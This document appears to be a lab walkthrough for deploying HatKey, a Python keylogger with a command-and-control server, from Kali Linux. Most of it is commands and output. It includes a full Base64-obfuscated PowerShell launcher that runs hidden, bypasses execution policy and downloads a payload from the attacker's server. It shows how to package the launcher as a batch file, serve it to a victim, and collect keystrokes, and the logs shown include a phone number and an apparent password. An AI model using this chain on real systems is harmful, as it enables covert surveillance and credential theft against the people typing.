
---
# Cross-Platform Keylogger Framework on Kali Linux

## Theory
HatKey is a Python-based Command & Control (C2) keylogger designed for red team operations and authorized penetration testing. Key features:

Payload Delivery: PowerShell Empire-style obfuscated payloads
C2 Communication: HTTP beaconing with dynamic payload retrieval
Stealth: Windowless execution, AV bypass via Base64 encoding
Cross-Platform: Windows targets (primary), extensible architecture
Real-time Logging: Timestamped keystroke capture with context (app titles)
Persistence: Designed for campaign-style operations
Attack Chain:

**1. C2 Server (Kali) ←HTTP→ 2. Beacon (Victim) → 3. Keystroke Harvest → 4. Output Files**

## Technical Details:

- Base64-encoded PowerShell downloads secondary payload
- Double IEX() obfuscation evades signature-based detection
- Application context capture (window titles) for targeted intel
- Agent ID generation via IP+hostname for tracking
## Practical Lab Setup and Execution

### Prerequisites
- Kali Linux (Python2 required for legacy compatibility)
- Target Windows systems (AV disabled for testing)
- Network connectivity between C2 and targets
- Authorization: Pre-verified pentesting platform
## Step-by-Step Terminal Commands
1. Repository Acquisition & Setup
```
cd ~/Desktop/tool
git clone https://github.com/Naayouu/Hatkey
cd Hatkey
ls -alps
chmod +x HatKey.py
```
**Explanation:**
- git clone: Downloads C2 framework (69 objects, 281KB)
- ls -alps: Shows structure (HatKey.py, Lib/, Output/)
- chmod +x: Executable permissions (redundant for Python but good practice)

2. HatKey C2 Server Initialization
```
python2 HatKey.py
```

Output:
```
_______ 
< HatKey >
------- 
--=[KeyLogger v1.0.0 by Farzin Enddo]
```
Interactive Console Commands:
```
HatKey > help     # Command reference
HatKey > show     # Current configuration
HatKey > set      # Configure variables
HatKey > list     # Active agents
HatKey > run      # Start C2 server
```

3. C2 Server Configuration
```
HatKey > set host 192.168.146.128
HatKey > set port 8080
HatKey > show
```
Explanation:

- **host: C2 listener IP (attacker's Kali interface)**
- **port: HTTP beacon port (default 8080)**
- **Validates network reachability before payload generation**

4. Generate & Deploy Payload

```
HatKey > run
```

Output:

```
[+] Server start on: http://192.168.146.128:8080/
[+] Keylogger launcher is:
powershell -exec bypass -WindowStyle Hidden IEX(IEX("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoImh0dHA6Ly8xOTIuMTY4LjE0Ni4xMjg6ODA4MC9nZXRfcGF5bG9hZCIp'))"))
```

Payload Breakdown:

- powershell -exec bypass     Bypass AMSI/Constrained Language
- -WindowStyle Hidden         Invisible execution
- IEX( [Base64-Decode] )        Dynamic payload download

5. Payload Delivery Vector Creation
```
cd ~/Desktop
cat > keyphone.bat << EOF
powershell -exec bypass -WindowStyle Hidden IEX(IEX("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoImh0dHA6Ly8xOTIuMTY4LjE0Ni4xMjg6ODA4MC9nZXRfcGF5bG9hZCIp'))"))
EOF
```
Explanation: Creates executable batch file for Windows deployment

6. Host Payload Serving
```
cd ~/Desktop
python2 -m SimpleHTTPServer 8000
```
Explanation:
- Serves keyphone.bat via HTTP on port 8000
- Windows victim downloads via http://192.168.146.128:8000/keyphone.bat

7. Target Execution (Windows Victim)
```

# On Windows target (AV disabled):
1. Copy keyphone.bat to Desktop
2. Double-click execute
3. No visible window/process
```

C2 Callback (Kali):

```
[+] Agent Connected: 192.168.15.1.saxen
```

## Complete Terminal Session
```
# Setup
root@kali:~/Desktop/tool# git clone https://github.com/Naayouu/Hatkey && cd Hatkey
root@kali:~/Desktop/tool/Hatkey# python2 HatKey.py

# Configure & Run C2
HatKey > set host 192.168.146.128
HatKey > run
[+] Server: http://192.168.146.128:8080/
[+] Payload: powershell -exec bypass ...

# Deploy (separate terminal)
root@kali:~/Desktop# cat > keyphone.bat <<EOF
powershell -exec bypass ...
EOF
root@kali:~/Desktop# python2 -m SimpleHTTPServer

# Victim execution → Agent Connected!
[+] Agent Connected: 192.168.15.1.saxen
```
## Harvested Evidence Analysis
Output Directory: **Hatkey/Output/**

```
┌──(root㉿kali)-[~/Desktop/tool/Hatkey/Output]
└─# ls -la
-rw-r--r-- 1 root root  1247 Mar 18 10:02 192.168.15.1.saxen.txt
```
Keystroke Log Contents:

```
Agent ID: 192.168.15.1.saxen
[New Tab - Google Chrome - 18-03-2026:10:01:07:10]
hllo[Enter]facebook.com[Enter]
[Facebook - Google Chrome - 18-03-2026:10:01:32:85]
9958452532[Enter]hcjbbdbdl[Space]m
[CUPP Wordlist Generation - 10:02:41]
now[Space]run[Space]the[Space]bat[Shift]:[Shift][Enter]
notepad[Shift]:[Shift][Enter]
```

## **Intelligence Value:**
- Credentials: Phone numbers, passwords, search terms
- TTPs: Application usage patterns, browsing history
- Context: Timestamp + window title correlation
- Pivot Points: Discovered internal IPs, usernames